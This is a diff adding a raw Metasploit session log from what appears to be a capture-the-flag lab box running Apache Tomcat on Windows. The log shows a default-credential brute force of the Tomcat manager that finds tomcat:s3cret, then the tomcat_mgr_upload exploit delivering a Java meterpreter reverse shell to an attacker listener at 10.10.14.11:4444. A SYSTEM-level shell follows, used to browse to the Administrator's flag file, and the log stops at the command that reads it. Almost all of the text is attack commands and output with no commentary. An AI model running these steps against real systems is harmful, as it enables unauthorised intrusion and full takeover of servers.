@@ -1,0 +1,314 @@
+use auxiliary/scanner/http[*] Starting persistent handler(s)...
+msf6 > use auxiliary/scanner/http/tomcat_mgr_login
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.10.10.95
+RHOSTS => 10.10.10.95
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
+[!] No active DB -- Credential data will not be saved!
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:QLogic66 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:password (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:Password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:changethis (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:r00t (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:toor (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:j2deployer (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:OvW*busr1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:kdsxc (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:owaspba (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:ADMIN (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:xampp (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:QLogic66 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:password (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:Password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:changethis (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:r00t (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:toor (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:j2deployer (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:OvW*busr1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:kdsxc (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:owaspba (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:ADMIN (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:xampp (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:QLogic66 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:password (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:Password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:changethis (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:r00t (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:toor (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:j2deployer (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:OvW*busr1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:kdsxc (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:owaspba (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:ADMIN (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:xampp (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:QLogic66 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:password (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:Password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:changethis (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:r00t (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:toor (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:j2deployer (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:OvW*busr1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:kdsxc (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:owaspba (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:ADMIN (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role:xampp (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:QLogic66 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:password (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:Password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:changethis (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:r00t (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:toor (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:password1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:j2deployer (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:OvW*busr1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:kdsxc (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:owaspba (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:ADMIN (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:xampp (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
+[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
+
+
+
+msf6 > use exploit/multi/http/tomcat_mgr_upload
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/http/tomcat_mgr_upload) > options
+
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
+                                            oit/basics/using-metasploit.html
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be us
+                                            ed)
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java Universal
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
+HttpPassword => s3cret
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
+HttpUsername => tomcat
+msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.10.95
+RHOSTS => 10.10.10.95
+msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
+RPORT => 8080
+msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.10.14.11
+LHOST => 10.10.14.11
+msf6 exploit(multi/http/tomcat_mgr_upload) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
+[*] Started reverse TCP handler on 10.10.14.11:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying 3RJvsGp5r...
+[*] Executing 3RJvsGp5r...
+[*] Undeploying 3RJvsGp5r ...
+[*] Sending stage (58073 bytes) to 10.10.10.95
+[*] Undeployed at /manager/html/undeploy
+[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.95:49192) at 2025-08-09 09:16:42 -0400
+
+meterpreter > 
+meterpreter > getuid
+Server username: JERRY$
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0834-6C04
+
+ Directory of C:\apache-tomcat-7.0.88
+
+06/19/2018  04:07 AM    <DIR>          .
+06/19/2018  04:07 AM    <DIR>          ..
+06/19/2018  04:06 AM    <DIR>          bin
+06/19/2018  06:47 AM    <DIR>          conf
+06/19/2018  04:06 AM    <DIR>          lib
+05/07/2018  02:16 PM            57,896 LICENSE
+08/09/2025  04:05 PM    <DIR>          logs
+05/07/2018  02:16 PM             1,275 NOTICE
+05/07/2018  02:16 PM             9,600 RELEASE-NOTES
+05/07/2018  02:16 PM            17,454 RUNNING.txt
+08/09/2025  04:16 PM    <DIR>          temp
+08/09/2025  04:16 PM    <DIR>          webapps
+06/19/2018  04:34 AM    <DIR>          work
+               4 File(s)         86,225 bytes
+               9 Dir(s)   2,419,384,320 bytes free
+
+C:\apache-tomcat-7.0.88>cd ..
+cd ..
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0834-6C04
+
+ Directory of C:\
+
+06/19/2018  04:07 AM    <DIR>          apache-tomcat-7.0.88
+08/22/2013  06:52 PM    <DIR>          PerfLogs
+06/19/2018  06:42 PM    <DIR>          Program Files
+06/19/2018  06:42 PM    <DIR>          Program Files (x86)
+06/18/2018  11:31 PM    <DIR>          Users
+01/21/2022  09:53 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)   2,419,384,320 bytes free
+
+C:\>cd Users
+cd Users
+
+C:\Users>dir
+
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0834-6C04
+
+ Directory of C:\Users
+
+06/18/2018  11:31 PM    <DIR>          .
+06/18/2018  11:31 PM    <DIR>          ..
+06/18/2018  11:31 PM    <DIR>          Administrator
+08/22/2013  06:39 PM    <DIR>          Public
+               0 File(s)              0 bytes
+               4 Dir(s)   2,419,384,320 bytes free
+
+C:\Users>
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>cd
+cd
+C:\Users\Administrator
+
+
+C:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0834-6C04
+
+ Directory of C:\Users\Administrator
+
+06/18/2018  11:31 PM    <DIR>          .
+06/18/2018  11:31 PM    <DIR>          ..
+06/19/2018  06:43 AM    <DIR>          Contacts
+06/19/2018  07:09 AM    <DIR>          Desktop
+06/19/2018  06:43 AM    <DIR>          Documents
+01/21/2022  09:23 PM    <DIR>          Downloads
+06/19/2018  06:43 AM    <DIR>          Favorites
+06/19/2018  06:43 AM    <DIR>          Links
+06/19/2018  06:43 AM    <DIR>          Music
+06/19/2018  06:43 AM    <DIR>          Pictures
+06/19/2018  06:43 AM    <DIR>          Saved Games
+06/19/2018  06:43 AM    <DIR>          Searches
+06/19/2018  06:43 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)   2,419,384,320 bytes free
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0834-6C04
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/19/2018  07:09 AM    <DIR>          .
+06/19/2018  07:09 AM    <DIR>          ..
+06/19/2018  07:09 AM    <DIR>          flags
+               0 File(s)              0 bytes
+               3 Dir(s)   2,419,384,320 bytes free
+
+C:\Users\Administrator\Desktop>cd flagd
+cd flagd
+The system cannot find the path specified.
+
+C:\Users\Administrator\Desktop>cd flags
+cd flags
+
+C:\Users\Administrator\Desktop\flags>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0834-6C04
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  07:09 AM    <DIR>          .
+06/19/2018  07:09 AM    <DIR>          ..
+06/19/2018  07:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)   2,419,384,320 bytes free
+
+C:\Users\Administrator\Desktop\flags>more "2 for the price of 1.txt"
+more "2 for the price of 1.txt"
